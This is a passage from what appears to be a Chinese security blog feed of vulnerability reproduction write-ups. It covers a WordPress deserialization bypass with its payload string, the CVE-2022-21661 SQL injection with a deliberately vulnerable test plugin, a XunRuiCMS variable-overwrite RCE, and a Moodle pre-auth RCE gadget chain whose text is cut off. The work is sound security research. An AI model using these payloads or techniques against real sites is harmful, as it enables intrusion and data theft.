<code>$option</code>是每个选项的键，<code>$value</code>是每个选项的值</p><p>首先看到 <code>sanitize_option</code></p><p><img src="1645019077487-63d2de3b-61aa-4518-b451-da43f296998b.png" alt="1"></p><p>这个函数会根据不同的键来选择不同的处理方式，比如一些一定会用整数的，就会<code>intval</code>处理，所以选择的选项也是有讲究的，我之前选择的<code>blogdescription</code>，就因为这个函数而无法使用，他会将一些特殊字符编码，导致无法正常反序列化，这个可以慢慢尝试，尽量选择这个函数不会进行太多处理的选项</p><p>最终我选择的是 <code>wp-admin/options-writing.php</code>中的 “密码”（选择 <code>options.php</code>中的<code>mailserver_pass</code>也一样，是同一个），一般来说，密码对字符都不会有太多的限制，至少这里是的</p><p>回到之前的 <code>update_option</code>的代码，稍微注意一下这里的比较</p><p><img src="1645019573871-fdeab791-ede5-4600-a056-4f7078ebbd2f.png" alt="1"></p><p>如果我们输入的选择没有发生改变，就不会继续后面的代码，继续往下走，进入 <code>wp-includes/functions.php</code>中的<code>maybe_serialize</code>函数</p><p><img src="1645019673851-234d1ec8-df55-4aca-9061-e5135495d0b3.png" alt="1"></p><p>如果是数组或者对象，那么会直接序列化后返回。然后进入 <code>is_serialized</code>函数</p><p><img src="1645019938888-04cd4b78-79fd-4241-b3af-ff47887561e6.png" alt="1"></p><p>这里会取字符串的第一个字符进行比较，这里几乎囊括了反序列化字符串的所有类型，遇到是这一些的，返回后会再次反序列化，也就是进行了二次反序列化，这样几乎是防止了可能的反序列化。</p><p>这里遗漏了一个 <code>C</code>类型，官方文档对他的描述是 <code>custom object</code>，自定义对象，这个以前几乎没有用到过，因此这次进行了一次测试</p><p>代码：</p><p><img src="1645020351734-9990d977-de53-4a24-aca9-bd63b028f825.png" alt="1"></p><p>结果</p><p><img src="1645020369446-b14a18bd-de76-4cff-a147-8a6be7c72f58.png" alt="1"></p><p>同一个类，将类型从 <code>O</code>修改为了 <code>C</code>，反序列化运行后，虽然报错，但最后仍然会触发 <code>__destruct</code>方法，因此我们可以将一个正常的反序列化字符串，将第一个字符 <code>O</code>修改为 <code>C</code>，这样就可以逃过这里的二次反序列化，从而将我们的反序列化字符串写入数据库，等待触发即可。</p><h2 id="0x03-漏洞复现"><a href="#0x03-漏洞复现" class="headerlink" title="0x03 漏洞复现"></a>0x03 漏洞复现</h2><p>本菜鸡找不到 <code>wordpress</code>的链子，只能随意触发一个 <code>__destruct</code>意思意思</p><p>这里使用 <code>wp-includes/Requests/Transport/cURL.php</code>中的 <code>Requests_Transport_cURL</code>类</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">C:<span class="hljs-number">23</span>:<span class="hljs-string">&quot;Requests_Transport_cURL&quot;</span>:<span class="hljs-number">0</span>:&#123;&#125;<br></code></pre></td></tr></table></figure><p><img src="1645023884766-f85640ae-ec93-4dc7-8628-ac65c61c434b.png" alt="1"></p><p>查看数据库，并没有被二次序列化</p><p><img src="1645023970947-30b7edf1-91c0-48c7-bc57-5b393204ccfd.png" alt="1"></p><p>来到<code>wp-admin/options.php</code>，将 <code>db_version</code>修改为 10300</p><p><img src="1645023029331-b66ec169-d09a-4e68-99bf-e518e70d140a.png" alt="1"></p><p>这里一个意外的发现，修改数据库的时候就会触发漏洞入口</p><p><img src="1645023123738-90cfe6b9-ba3c-4223-bc49-51f3bbb56096.png" alt="1"></p><p>成功取出数据库中的反序列化串，并且执行反序列化</p><p><img src="1645024213088-02a0060d-93be-4e5b-8af9-b9fe7e7b1d9a.png" alt="1"></p><p>触发 <code>__destruct</code>方法</p><p><img src="1645024236432-924e1694-930c-4678-bd14-82905aed5cb9.png" alt="1"></p><h2 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h2><p>坑点不少，需要多琢磨，不说了，还是太菜了，都没法搞条链子。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;本文首发于奇安信攻防社区：&lt;a href=&quot;https://forum.butian.net/share/1303&quot;&gt;https://forum.butian.net/share/1303&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;本文仅用于技术讨论与研究，文中的实现方法切勿应用在任何违法场景</summary>
      
    
    
    
    <category term="PHP漏洞复现" scheme="https://n0puple.github.io/categories/PHP%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
    <category term="PHP" scheme="https://n0puple.github.io/tags/PHP/"/>
    
    <category term="CVE" scheme="https://n0puple.github.io/tags/CVE/"/>
    
    <category term="漏洞复现" scheme="https://n0puple.github.io/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    <category term="WordPress" scheme="https://n0puple.github.io/tags/WordPress/"/>
    
    <category term="对象注入漏洞" scheme="https://n0puple.github.io/tags/%E5%AF%B9%E8%B1%A1%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"/>
    
  </entry>
  
  <entry>
    <title>WordPress_5.8.2_核心SQL注入漏洞_CVE-2022-21661</title>
    <link href="https://n0puple.github.io/2022/02/15/WordPress-5-8-2-%E6%A0%B8%E5%BF%83SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-CVE-2022-21661/"/>
    <id>https://n0puple.github.io/2022/02/15/WordPress-5-8-2-%E6%A0%B8%E5%BF%83SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-CVE-2022-21661/</id>
    <published>2022-02-15T02:28:26.000Z</published>
    <updated>2022-11-04T14:19:30.946Z</updated>
    
    <content type="html"><![CDATA[<p>本文首发于奇安信攻防社区：<a href="https://forum.butian.net/share/1324">https://forum.butian.net/share/1324</a></p><p>本文仅用于技术讨论与研究，文中的实现方法切勿应用在任何违法场景。如因涉嫌违法造成的一切不良影响，本文作者概不负责。</p><h2 id="0x00-漏洞描述"><a href="#0x00-漏洞描述" class="headerlink" title="0x00 漏洞描述"></a>0x00 漏洞描述</h2><p>这是最近爆出来的一个 <code>wordpress</code>的<code>SQL</code>注入漏洞，实际上不是一个可以直接利用的洞，而是<code>wordpress</code>的一个核心函数 <code>WP_Query</code>的漏洞，这个函数常被插件使用，因此能造成的危害也挺大，前台后台都有可能。</p><h2 id="0x01-漏洞影响"><a href="#0x01-漏洞影响" class="headerlink" title="0x01 漏洞影响"></a>0x01 漏洞影响</h2><p><code>wordpress &lt; 5.8.3</code></p><p>这里是修复链接</p><p><a href="https://github.com/WordPress/WordPress/commit/6f7032dcf423b67f90381d4f29a90d16f4829070">https://github.com/WordPress/WordPress/commit/6f7032dcf423b67f90381d4f29a90d16f4829070</a></p><p><img src="1645102019548-1c3129e9-7c36-4ce2-9de3-8cd16cb0ae77.png" alt="image.png"></p><p>我们 <code>git</code>下载后，恢复到上一个版本</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">git <span class="hljs-keyword">clone</span> https:<span class="hljs-comment">//github.com/WordPress/WordPress</span><br>git checkout <span class="hljs-number">266</span>c58518846<br></code></pre></td></tr></table></figure><h2 id="0x02-漏洞分析"><a href="#0x02-漏洞分析" class="headerlink" title="0x02 漏洞分析"></a>0x02 漏洞分析</h2><p>因为此漏洞在插件中出现较多，因此这里我们也造一个插件来进行测试复现，网上已经有师傅写好了 <code>demo</code>，我这里直接用</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">Plugin Name: CVE-2022-21661-test-plugin</span><br><span class="hljs-comment">Plugin URL: https://www.lsablog.com/networksec/penetration/cve-2022-21661-wordpress-core-sqli-analysis</span><br><span class="hljs-comment">Description: This plugin was made in order to test CVE-2022-21661 (wordpress core sql injection)</span><br><span class="hljs-comment">Version: v1.0</span><br><span class="hljs-comment">Author: LSA</span><br><span class="hljs-comment">Author&#x27;s Blog: https://www.lsablog.com/</span><br><span class="hljs-comment">License: MIT</span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">testSQLiCVE202221661</span>(<span class="hljs-params"></span>)</span>&#123;<br><br><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;test-cve-2022-21661-plugin&#x27;</span>;<br><br>    <span class="hljs-variable">$inputData</span> = <span class="hljs-title function_ invoke__">stripslashes</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;data&#x27;</span>]);<br>    <span class="hljs-variable">$jsonDecodeInputData</span> = <span class="hljs-title function_ invoke__">json_decode</span>(<span class="hljs-variable">$inputData</span>,<span class="hljs-literal">true</span>);<br>    <span class="hljs-variable">$wpTest</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">WP_Query</span>(<span class="hljs-variable">$jsonDecodeInputData</span>);<br>    <span class="hljs-title function_ invoke__">wp_die</span>();<br>&#125;<br><br><span class="hljs-title function_ invoke__">add_action</span>(<span class="hljs-string">&#x27;wp_ajax_nopriv_testcve202221661&#x27;</span>,<span class="hljs-string">&#x27;testSQLiCVE202221661&#x27;</span>);<br></code></pre></td></tr></table></figure><p>写入 <code>php</code>文件，打包成 <code>zip</code>格式，后台安装插件并启用</p><p>这里的插件是不用权限就可以访问的，<code>admin</code>权限访问反而存在问题，正常访问显示如下</p><p><img src="1645103521554-d2846aaf-7df3-46e6-a553-003e4d061141.png" alt="image.png"></p><p>好了，接下来开始调试，看到插件代码，位于 <code>wp-content/plugins/CVE-2022-21661-test-plugin/CVE-2022-21661-test-plugin.php</code></p><p><img src="1645103635627-6bddf23b-653a-4b46-b4c8-3f3cb0f75a9b.png" alt="image.png"></p><p><code>post</code>的<code>data</code>使用了 <code>stripslashes</code>，<code>post</code>的参数默认会被转义，因此用这个函数去掉转义符等，然后 <code>json_decode</code>解码，也就是说我们传入的数据需要是 <code>json</code>格式的，最后传入 <code>WP_Query</code></p><p>跟进 <code>wp-includes/class-wp-query.php</code>的构造方法</p><p><img src="1645104192903-4b660d49-8c12-4c3a-8962-dde93ee542c6.png" alt="image.png"></p><p>继续跟进 <code>query</code>方法</p><p><img src="1645104421273-bc080a34-fa1a-4c53-8e20-aeeff30a5855.png" alt="image.png"></p><p><code>$query</code>是我们传入的 <code>json</code>解码后的数据，处理一下后进入 <code>get_posts</code>方法</p><p><img src="1645104830365-2be61a3c-870b-4018-a423-0f88356f5293.png" alt="image.png"></p><p>将 <code>$this-&gt;query_vars</code>赋值给了 <code>$q</code>，然后还加入了一些其他的参数，因此 <code>$q</code>部分可控，继续往下看</p><p><img src="1645105048461-3fc7776d-941d-4d52-95f0-9975d9fe1fa5.png" alt="image.png"></p><p><code>$this-&gt;is_singular</code>默认为 <code>false</code>，进入 <code>if</code>语句，然后使用 <code>parse_tax_query</code>方法处理 <code>$q</code>，我们看看代码</p><p><img src="1645340595117-4f864e36-96ca-4bf9-968e-33c3e2e2d0fe.png" alt="image.png"></p><p>在这里，<code>$q</code>中存在的一些值会赋值给 <code>$tax_query</code>，比如，<code>$q</code>中存在 <code>tax_query</code>这个键并且是数组的时候，就会将他的值存入 <code>$tax_query</code>，拉到最后可以看到实例化了 <code>WP_Tax_Query</code>，而 <code>$tax_query</code>的值就会作为初始化的值传入 <code>WP_Tax_Query</code></p><p><img src="1645340962424-faaba21b-6d7a-4359-a1cb-62f87e39c70a.png" alt="image.png"></p><p>看到 <code>wp-includes/class-wp-tax-query.php</code>中的 <code>__construct</code></p><p><img src="1645341126441-5696c72f-5575-4977-b827-17a1da1dcfc7.png" alt="image.png"></p><p>跟进 <code>sanitize_query</code>方法</p><p><img src="1645356871711-d4b92b4a-59b2-4932-b26c-553a4ab1afa9.png" alt="image.png"></p><p>这里是对 <code>$queries</code>的一些处理，返回值为 <code>$cleaned_query</code>，因此要找到可控的赋值</p><p><code>foreach</code>遍历 <code>$queries</code>，使用<code>is_first_order_clause</code>进行判断</p><p><img src="1645369819185-0728e203-6978-416a-87f5-74f6db6d42b7.png" alt="image.png"></p><p><code>$query</code>中存在一个值为数组，且数组的键为 <code>terms</code>就进入该分支，<code>$queries</code> 部分可控，因此很容易满足这个条件，最后和 <code>defaults</code>合并后存入 <code>$cleaned_query</code></p><p>这里返回后的数据最后会赋值给 <code>$this-&gt;queries</code>，后面会用到这个数据</p><p>回到比较上面的<code>$this-&gt;tax_query-&gt;get_sql</code>，进入 <code>wp-includes/class-wp-tax-query.php</code>的 <code>get_sql</code>方法</p><p><img src="1645107644418-acac8222-7735-4e62-b20c-3d04a08d67a6.png" alt="image.png"></p><p>继续跟进 <code>get_sql_clauses</code>方法</p><p><img src="1645107786798-70da1fb4-92a8-49eb-90be-5a0af23a5d7a.png" alt="image.png"></p><p>这里就将 <code>$this-&gt;queries</code>取出来了，然后进入 <code>get_sql_for_query</code>方法</p><p><img src="1645109146065-168ca4d9-2bd8-46cd-ab6e-8e128dcfef3f.png" alt="image.png"></p><p>遍历 <code>$query</code>，当 <code>$clause</code>为数组时，进入 <code>elseif</code>分支，再跟进 <code>is_first_order_clause</code>方法进行判断</p><p><img src="1645109296540-adb8ff54-9bfb-43eb-8314-2db1e6abff59.png" alt="image.png"></p><p>这个判断很简单，为数组且包含 <code>terms</code>这个键时为真，继续跟进上面的 <code>get_sql_for_clause</code></p><p><img src="1645109675055-b98c4529-6679-4a87-b062-e5fc4b9253f6.png" alt="image.png"></p><p>主要看到这个 <code>clean_query</code>方法，也是漏洞点所在的位置，这实际上是一个用于过滤潜在的危险的函数</p><p><img src="1645109756537-8e1e4e30-45d8-4869-b87f-e8cb01102056.png" alt="image.png"></p><p>前面的都是一些简单的判断，很容易就可以绕过，<code>$query[&#39;terms&#39;]</code>去重，最后进入 <code>transform_query</code>方法</p><p><img src="1645110303953-72fa8b9d-66fe-4521-93d7-5c719cbcf207.png" alt="image.png"></p><p>满足条件 <code>$query[&#39;field&#39;] == $resulting_field</code>即可绕过这个方法，不进行其他操作</p><p>回到 <code>get_sql_for_clause</code>方法，执行完 <code>clean_query</code>后的代码如下</p><p><img src="1645110644316-5c34cca6-eb90-448b-99ed-b2b380cc3b8c.png" alt="image.png"></p><p><code>$terms</code>接收 <code>clean_query</code>方法处理过的 <code>$clause[&#39;terms&#39;]</code>，当 <code>$operator</code>为 <code>NOT IN</code>时，就会拼接 <code>SQL</code>语句，造成注入，进入其他分支也是可以的，都一样，后面就不用讲了。</p><h2 id="0x03-漏洞复现"><a href="#0x03-漏洞复现" class="headerlink" title="0x03 漏洞复现"></a>0x03 漏洞复现</h2><p><img src="1645371797533-b52f553e-d0e1-4afb-af14-b7fe762dd1f3.png" alt="image.png"></p><p>注意右下角的延时</p><h2 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h2><p><code>wordpress</code>的漏洞还是比较少的，尤其是这种核心漏洞，使用到这个函数的插件很容易受到影响，又很难受到影响，很容易是因为使用的插件还是很多的，很难是因为输入的参数存在转义，所以需要很多的凑巧才能成功利用，不过存在一个比较大的基数，找到受影响的应该不难，连续分析了两个 <code>wordpress</code>近期的漏洞，给我的感觉就是，大的系统不是没有漏洞，而是缺少挖到他的人。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;本文首发于奇安信攻防社区：&lt;a href=&quot;https://forum.butian.net/share/1324&quot;&gt;https://forum.butian.net/share/1324&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;本文仅用于技术讨论与研究，文中的实现方法切勿应用在任何违法场景</summary>
      
    
    
    
    <category term="PHP漏洞复现" scheme="https://n0puple.github.io/categories/PHP%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
    <category term="PHP" scheme="https://n0puple.github.io/tags/PHP/"/>
    
    <category term="CVE" scheme="https://n0puple.github.io/tags/CVE/"/>
    
    <category term="漏洞复现" scheme="https://n0puple.github.io/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    <category term="SQL注入漏洞" scheme="https://n0puple.github.io/tags/SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"/>
    
    <category term="WordPress" scheme="https://n0puple.github.io/tags/WordPress/"/>
    
  </entry>
  
  <entry>
    <title>XunRuiCMS_变量覆盖导致的前台RCE</title>
    <link href="https://n0puple.github.io/2022/01/25/XunRuiCMS-%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96%E5%AF%BC%E8%87%B4%E7%9A%84%E5%89%8D%E5%8F%B0RCE/"/>
    <id>https://n0puple.github.io/2022/01/25/XunRuiCMS-%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96%E5%AF%BC%E8%87%B4%E7%9A%84%E5%89%8D%E5%8F%B0RCE/</id>
    <published>2022-01-25T02:28:26.000Z</published>
    <updated>2022-12-10T05:29:38.677Z</updated>
    
    <content type="html"><![CDATA[<p>本文仅用于技术讨论与研究，文中的实现方法切勿应用在任何违法场景。如因涉嫌违法造成的一切不良影响，本文作者概不负责。</p><h2 id="0x00-漏洞简介"><a href="#0x00-漏洞简介" class="headerlink" title="0x00 漏洞简介"></a>0x00 漏洞简介</h2><p>先后在两篇文章中看到了这个<code>cms</code>，利用方式感觉很有意思，遂跟着复现一波写下了这篇文章。</p><h2 id="0x01-影响范围"><a href="#0x01-影响范围" class="headerlink" title="0x01 影响范围"></a>0x01 影响范围</h2><p>影响在此修复之前的版本 </p><p><a href="https://gitee.com/dayrui/xunruicms/commit/80e2d8f3008384d926c64163b7334a260edc0a51">https://gitee.com/dayrui/xunruicms/commit/80e2d8f3008384d926c64163b7334a260edc0a51</a></p><p>此处测试环境为修复的前一个版本，可 <code>git</code> 下载后执行命令</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">git checkout fad7b01<br></code></pre></td></tr></table></figure><h2 id="0x02-漏洞分析"><a href="#0x02-漏洞分析" class="headerlink" title="0x02 漏洞分析"></a>0x02 漏洞分析</h2><p>我们可以根据修复记录来复现漏洞</p><h3 id="变量覆盖"><a href="#变量覆盖" class="headerlink" title="变量覆盖"></a>变量覆盖</h3><p>首先定位到 <code>dayrui/Fcms/Core/View.php</code>的<code>display</code>方法，218 行存在一个 <code>extract</code>函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">extract</span>(<span class="hljs-variable">$this</span>-&gt;_options, EXTR_OVERWRITE);<br></code></pre></td></tr></table></figure><p>第二个参数为 <code>EXTR_OVERWRITE</code>，也就是可以覆盖已存在的变量，那么只要 <code>$this-&gt;_options</code>可控，我们就可以得到一个变量覆盖漏洞，因此寻找赋值的位置<br>同样在该文件</p><p><img src="1644246657397-22191b3d-1b41-4a65-8632-f86a52e8d5bc.png" alt="image.png"></p><p>从注释可以看到这个方法是用来设置模板变量的，这里将传入的第一个参数全部放入了 <code>$this-&gt;_options</code><br><code>dayrui/Fcms/Control/Api/Api.php</code>中的 <code>template</code>方法使用 <code>assign</code>来设置模板变量，并且参数可以通过 <code>GET</code>得到，因此可控，间接导致了 <code>$this-&gt;_options</code>可控，之后又进入 <code>display</code>方法，触发 <code>extract</code>，因此存在变量覆盖漏洞</p><p><img src="1644247366176-b26669e0-0b2c-4766-a3bb-5e67f99e4f89.png" alt="image.png"></p><p>现在继续跟进 <code>display</code>方法</p><p><img src="1644324477787-3e232cfe-ed7f-436a-9a9e-5ea191e654a7.png" alt="image.png"></p><p>由于存在变量覆盖漏洞，因此 <code>$phpcmf_name</code>和 <code>$phpcmf_dir</code>都可控，之后进入 <code>get_file_name</code>方法，两个参数都可控，这个方法就不跟进看了，最后得到的 <code>$_view_file</code>可控，继续往下走</p><p><img src="1644324685908-e4ac4fa3-e46e-481d-93ff-1bb4f60f9311.png" alt="image.png"></p><p><code>load_view_file</code>方法会根据 <code>$_view_file</code>生成一个 <code>cache file</code>并返回文件路径，最后包含该文件</p><h3 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h3><p>现在我们需要找到一处可以命令执行的地方，而 <code>View.php</code>中有一个 <code>list_tag</code>方法</p><p><img src="1644326182325-98df5d65-533c-44fb-81f5-4eec886f4a5b.png" alt="image.png"></p><p>这里存在一个 <code>switch ... case ...</code>当 <code>$system[&#39;action&#39;]</code>为 <code>function</code>时就可以进入上面的分支，从而有机会被执行</p><p>在变量覆盖块，我们讲到了可以包含模板文件，我们可以选择 <code>dayrui/Fcms/View/api_related.html</code></p><p>生成 <code>cache</code>文件后包含，在被包含的文件中，我们可以找到</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">list_tag</span>(<span class="hljs-string">&quot;action=module module=<span class="hljs-subst">$mid</span> siteid=<span class="hljs-subst">$site</span> where=<span class="hljs-subst">$where</span> order=updatetime page=1 pagesize=<span class="hljs-subst">$pagesize</span> urlrule=<span class="hljs-subst">$urlrule</span>&quot;</span>);<br></code></pre></td></tr></table></figure><p>因此可以调用到 <code>list_tag</code>方法，并且可以用变量覆盖来控制参数，接下来我们进入 <code>list_tag</code></p><p><img src="1644326537174-64b2314c-eb4b-4c14-b1a5-030f46e3d5c5.png" alt="image.png"></p><p><code>$params</code>就是传进来的参数，也就是上面那一大串，部分为我们所控</p><p>这里使用 <code>explode</code>，按空格分割并写入数组，之后取出数组每一项用 <code>=</code>分割，分别得到 <code>$var</code>和 <code>$val</code>，最后如果存在 <code>$system[$var]</code>，就会用处理过的<code>$val</code>覆盖</p><p>因此我们可以利用可控的变量来覆盖 <code>$system[&#39;action&#39;]</code>从而进入 <code>function</code>分支，到后面就比较简单了，这里不多赘述。</p><h2 id="0x03-漏洞复现"><a href="#0x03-漏洞复现" class="headerlink" title="0x03 漏洞复现"></a>0x03 漏洞复现</h2><p>因为调用 <code>display</code>的地方使用了 <code>ob_start</code>，因此一般的命令都没有回显，所以使用的弹计算器的方式</p><p>自己弹了一下自己，只是我的计算器早就被我删了</p><p><img src="1644334744634-94e79d78-cf97-4ec2-a5a3-d576a8405421.png" alt="image.png"></p><h2 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h2><p>利用方式很有意思，但是有一点点复杂，有兴趣的话可以自己手调一下，会有更多的收获的，若是有什么疑问的地方，欢迎私聊交流讨论。</p><h2 id="0x05-参考链接"><a href="#0x05-参考链接" class="headerlink" title="0x05 参考链接"></a>0x05 参考链接</h2><ul><li><a href="https://xz.aliyun.com/t/10002">https://xz.aliyun.com/t/10002</a></li><li><a href="https://forum.butian.net/share/1072">https://forum.butian.net/share/1072</a></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;本文仅用于技术讨论与研究，文中的实现方法切勿应用在任何违法场景。如因涉嫌违法造成的一切不良影响，本文作者概不负责。&lt;/p&gt;
&lt;h2 id=&quot;0x00-漏洞简介&quot;&gt;&lt;a href=&quot;#0x00-漏洞简介&quot; class=&quot;headerlink&quot; title=&quot;0x00 漏洞简介</summary>
      
    
    
    
    <category term="PHP漏洞复现" scheme="https://n0puple.github.io/categories/PHP%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
    <category term="PHP" scheme="https://n0puple.github.io/tags/PHP/"/>
    
    <category term="未授权漏洞" scheme="https://n0puple.github.io/tags/%E6%9C%AA%E6%8E%88%E6%9D%83%E6%BC%8F%E6%B4%9E/"/>
    
    <category term="RCE" scheme="https://n0puple.github.io/tags/RCE/"/>
    
    <category term="漏洞复现" scheme="https://n0puple.github.io/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    <category term="CNVD" scheme="https://n0puple.github.io/tags/CNVD/"/>
    
    <category term="XunRuiCMS" scheme="https://n0puple.github.io/tags/XunRuiCMS/"/>
    
    <category term="变量覆盖" scheme="https://n0puple.github.io/tags/%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96/"/>
    
  </entry>
  
  <entry>
    <title>Moodle_3.11_前台RCE_CVE-2021-36394</title>
    <link href="https://n0puple.github.io/2021/10/21/Moodle-3-11-%E5%89%8D%E5%8F%B0RCE-CVE-2021-36394/"/>
    <id>https://n0puple.github.io/2021/10/21/Moodle-3-11-%E5%89%8D%E5%8F%B0RCE-CVE-2021-36394/</id>
    <published>2021-10-21T02:28:26.000Z</published>
    <updated>2022-12-02T13:37:14.877Z</updated>
    
    <content type="html"><![CDATA[<p>本文首发于先知社区：<a href="https://xz.aliyun.com/t/10383">https://xz.aliyun.com/t/10383</a></p><p>本文仅用于技术讨论与研究，文中的实现方法切勿应用在任何违法场景。如因涉嫌违法造成的一切不良影响，本文作者概不负责。</p><h2 id="0x00-漏洞简介"><a href="#0x00-漏洞简介" class="headerlink" title="0x00 漏洞简介"></a>0x00 漏洞简介</h2><p><code>Moodle</code> 是世界上最流行的学习管理系统。在几分钟内开始创建您的在线学习网站！</p><p><code>Moodle</code>的<code>Shibboleth</code>认证模块存在一个未授权远程代码执行漏洞。这在大学中被广泛使用，以允许来自一所大学的学生与其他大学进行身份验证，从而使他们能够参加外部课程并与其他人一起玩乐。</p><h2 id="0x01-漏洞影响"><a href="#0x01-漏洞影响" class="headerlink" title="0x01 漏洞影响"></a>0x01 漏洞影响</h2><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">3</span>.<span class="hljs-number">11</span>, <span class="hljs-number">3</span>.<span class="hljs-number">10</span> to <span class="hljs-number">3</span>.<span class="hljs-number">10</span>.<span class="hljs-number">4</span>, <span class="hljs-number">3</span>.<span class="hljs-number">9</span> to <span class="hljs-number">3</span>.<span class="hljs-number">9</span>.<span class="hljs-number">7</span> and earlier unsupported versions<br></code></pre></td></tr></table></figure><p>需要开启 <code>Shibboleth</code> 认证模块</p><p>可以 <code>fofa</code> 查看其使用，可以看到有 <code>13w</code> 条 <code>moodle</code> 应用</p><p><img src="0.png" alt="202210262318380.png"></p><h2 id="0x02-环境搭建"><a href="#0x02-环境搭建" class="headerlink" title="0x02 环境搭建"></a>0x02 环境搭建</h2><p>为了省去一些麻烦，这里我已经搭建好了漏洞 <code>docker</code>，可以在这里找到 <a href="https://github.com/N0puple/vulPOC/tree/main/Moodle/CVE-2021-36394%20Pre-Auth%20RCE%20in%20Moodle">CVE-2021-36394 Pre-Auth RCE in Moodle</a></p><p>执行如下操作</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">docker-compose up -d</span><br></code></pre></td></tr></table></figure><p>然后进入 <code>docker</code> ，更改文件 <code>/var/www/html/moodle-3.11.0/config.php</code></p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs rust">$CFG<span class="hljs-punctuation">-&gt;</span>wwwroot   = <span class="hljs-symbol">&#x27;http</span>:<span class="hljs-comment">//127.0.0.1&#x27;;</span><br></code></pre></td></tr></table></figure><p>将上面的链接改为自己的，必须是真实地址</p><h2 id="0x03-漏洞分析"><a href="#0x03-漏洞分析" class="headerlink" title="0x03 漏洞分析"></a>0x03 漏洞分析</h2><p>根据作者 <a href="https://haxolot.com/posts/2021/moodle_pre_auth_shibboleth_rce_part1/">博客</a> 上讲的，此漏洞大概可分为三部分，<code>session</code> 文件写入，<code>moodle</code> 反序列化链，反序列化执行入口</p><h3 id="moodle-反序列化链"><a href="#moodle-反序列化链" class="headerlink" title="moodle 反序列化链"></a>moodle 反序列化链</h3><p>先来看反序列化链，这并没有在 <code>PHPGGC</code> 收录，所以需要自己找，这里提供一条的简单分析，对细节感兴趣的童鞋可以调试一下</p><p>首先是 <code>__destruct</code> 入口，位于 <code>lib/classes/lock/lock.php</code></p><p><img src="1.png" alt="202210262318380.png"></p><p>可以看到 <code>$key</code> 可控，并且在字符串中，因此可以触发 <code>__toString</code></p><p>我们选择 <code>availability/classes/tree.php</code> 中的 <code>__toString</code> ，如图</p><p><img src="2.png" alt="202210262318380.png"></p><p><code>$this-&gt;children</code> 可控，因此可以对象遍历，我们可以选一个可以让我们命令执行的类，选择 <code>lib/classes/dml/recordset_walk.php</code> 的 <code>core\dml\recordset_walk</code> ，因为这里有一个 <code>current</code> 方法可以 <code>call_user_func</code> ，并且参数可控</p><p><img src="3.png" alt="202210262318380.png"></p><p><code>$this-&gt;callback</code> 可控，<code>$resord</code> 由 <code>$this-&gt;recordset-&gt;current()</code> 得到，我们可以看到 <code>$this-&gt;recordset</code>  ，需要实现的方法有很多，结合定义可以知道，<code>$this-&gt;recordset</code> 必须实现 <code>Iterator</code> ，因此范围就可以缩得比较小，最终确定使用 <code>question/engine/questionusage.php</code> 中的 <code>question_attempt_iterator</code> 类，但这个类默认没有被加载，需要一个类作为中介，这里可以选择 <code>question/classes/external.php</code> 中的  <code>core_question_external</code></p><p>如此即可得到反序列化链</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 